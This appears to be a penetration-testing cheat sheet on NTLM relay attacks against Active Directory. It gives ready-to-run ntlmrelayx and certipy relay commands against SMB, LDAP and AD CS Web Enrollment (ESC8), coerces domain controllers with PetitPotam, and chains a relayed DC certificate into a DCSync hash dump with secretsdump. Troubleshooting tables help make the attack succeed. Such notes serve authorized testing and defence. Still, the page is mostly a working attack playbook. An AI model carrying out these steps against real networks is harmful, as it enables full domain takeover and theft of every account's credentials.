# NTLM relay

Relay needs a **live** NTLM exchange. A captured NetNTLMv2 response cannot be replayed (crack it, or relay live). Authenticating ≠ rights: the relayed identity still needs rights on the destination.

| Path | Input | Result |
| --- | --- | --- |
| Crack | NetNTLM response | Password |
| Pass the Hash | NT hash | New authentication |
| Relay | Live authentication + suitable destination | Session as the source principal |
| Coercion | Forces a host to connect | Connection only: still needs a relay destination |

## Destination checks
| Destination | Needs | Blocker |
| --- | --- | --- |
| SMB | NTLM accepted, signing not required, rights on share/service | Required signing, NTLM restricted |
| LDAP | NTLM SASL accepted, no required signing, object rights | Required LDAP signing |
| LDAPS | NTLM accepted, no channel binding, object rights | Channel binding |
| AD CS HTTP | Web Enrollment accepts NTLM, no EPA, enrollable template | EPA, NTLM disabled, no template |

- LDAP signing and LDAPS channel binding are separate. `ldaps://` is not a fix; disabled SMB signing says nothing about LDAP.
- Source side: outbound NTLM policy, user vs machine identity, route to the listener.

```bash
nxc smb <FQDN>
curl -I http://<CA-FQDN>/certsrv/
ip route get <SOURCE-IP>
sudo ss -ltnp '( sport = :445 or sport = :80 )'
```
- Responder and `ntlmrelayx` cannot share 445/80: disable Responder's SMB/HTTP servers first.

## SMB relay, interactive
```bash
impacket-ntlmrelayx -h
sudo impacket-ntlmrelayx -t smb://<FQDN> -smb2support -i \
  -ip <KALI> --no-http-server --no-wcf-server --no-raw-server \
  --no-rpc-server --no-winrm-server --no-mssql-server --no-rdp-server
```
Trigger from the source host:
```cmd
dir \\<KALI>\probe
```
Then connect to the local port the relay prints:
```bash
nc 127.0.0.1 <CONSOLE-PORT>
```
```text
shares
use <SHARE>
ls
exit
```
- Without `-i` the default SMB action is a SAM dump. Older releases have fewer `--no-*-server` flags: check `-h`.
- Check the relay log shows the expected source account.

## LDAP relay
Rights = the relayed principal's own. Pick the action from confirmed object rights:
- Group / DACL edits → [object rights](object-rights.md)
- RBCD → [delegation](delegation.md)
- gMSA / LAPS reads → [managed credentials](managed-credentials.md)

- `--no-dump`, `--no-da`, `--no-acl` switch off distinct default actions: check `-h` before launching so a bind-only plan does not edit ACLs.

## AD CS relay (ESC8)
Needs Web Enrollment reachable, NTLM accepted, no EPA, and an authentication-capable template the source account may enroll in. `certipy find -vulnerable` flags it as `ESC8` ([adcs](adcs.md)).

Listener (pick one):
```bash
sudo certipy relay -target http://<CA-FQDN> -template DomainController \
  -subject 'CN=<HOSTNAME>' -interface <KALI> -out <HOSTNAME>
```
```bash
python3 -m venv ~/venvs/relay
~/venvs/relay/bin/pip install impacket 'pyopenssl==24.2.1'
sudo ~/venvs/relay/bin/ntlmrelayx.py -t http://<CA-FQDN>/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support
```
- Template: `DomainController` for a DC, `Machine` for other computers, `User` for users. Without `-template`, certipy picks Machine/User from a trailing `$`.
- `-subject`: a relayed machine account can arrive with an empty username (`/@` in the log), and the request then has no CN and fails. With an empty name certipy also falls back to `User`, so set `-template` explicitly.
- The pinned pyOpenSSL is only for Kali's packaged impacket 0.13.x, whose ADCS attack still calls `crypto.X509Req`.

Coerce the source (second terminal):
```bash
nxc smb <DC-IP> -u <USER> -p '<PW>' -M coerce_plus -o LISTENER=<KALI>
python3 PetitPotam.py -u <USER> -p '<PW>' -d <DOMAIN.TLD> <KALI> <DC-IP>
```
- `ERROR_BAD_NETPATH` from PetitPotam means the DC tried to connect: check the relay window.
- The CA can sit on the coerced DC itself (SMB in, HTTP out to the same host).

Cert → hash → DCSync:
```bash
certipy auth -pfx <HOSTNAME>.pfx -dc-ip <DC-IP>
impacket-secretsdump '<DOMAIN.TLD>/<HOSTNAME>$@<DC-IP>' -hashes :<NT> -just-dc
```
- A DC machine account holds replication rights ([credential-access](credential-access.md#dcsync-inspect-rights-and-select-the-account)). Non-DC machine cert → [delegation](delegation.md) / silver ticket instead.
- Issued but auth fails → [adcs](adcs.md) (SID mapping, EKU, PKINIT/Schannel).

## Troubleshooting
| Symptom | Check |
| --- | --- |
| No source connection | Trigger, routing/firewall, listener IP, port in use |
| Wrong identity arrives | User vs service/machine process |
| SMB requires signing | Measured signing: SMB relay not possible, pick another target |
| Auth accepted, action denied | Relayed identity and its rights |
| LDAP `strongerAuthRequired` | LDAP signing / channel binding |
| LDAP/HTTP auth rejected | NTLM restrictions, EPA, negotiate flags |
| Certificate request rejected | Template name, enrollment rights, EKU, approval |
| Certificate issued, auth fails | [adcs](adcs.md) |
| `Attribute's length must be >= 1` (certipy relay) | Empty relayed username → `-subject 'CN=<HOSTNAME>'` |
| `module 'OpenSSL.crypto' has no attribute 'X509Req'` | Kali impacket + new pyOpenSSL → venv pin above |
| `error code 200, treating as a successful login` | Not proof the relay worked; wait for the cert |
| `find`: HTTPS enrollment timed out | HTTPS disabled on the CA; only matters if HTTP is off too |
| `find`: `Found 0 certificate templates` | Irrelevant for ESC8; the template is named by hand |
